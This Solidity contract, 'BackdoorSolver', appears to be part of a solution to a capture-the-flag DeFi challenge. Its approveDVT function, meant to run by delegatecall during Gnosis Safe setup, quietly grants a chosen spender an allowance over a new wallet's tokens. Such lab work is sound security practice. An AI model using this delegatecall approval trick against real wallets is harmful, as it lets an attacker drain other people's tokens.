// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BackdoorSolver {
    IERC20 private immutable dvtToken;

    constructor(address dvtTokenAddress) {
        dvtToken = IERC20(dvtTokenAddress);
    }

    /**
     * @notice To be called by delegatecall from GnosisSafe::setup
     */
    function approveDVT(address spender, uint256 amount) public {
        dvtToken.approve(spender, amount);
    }
}
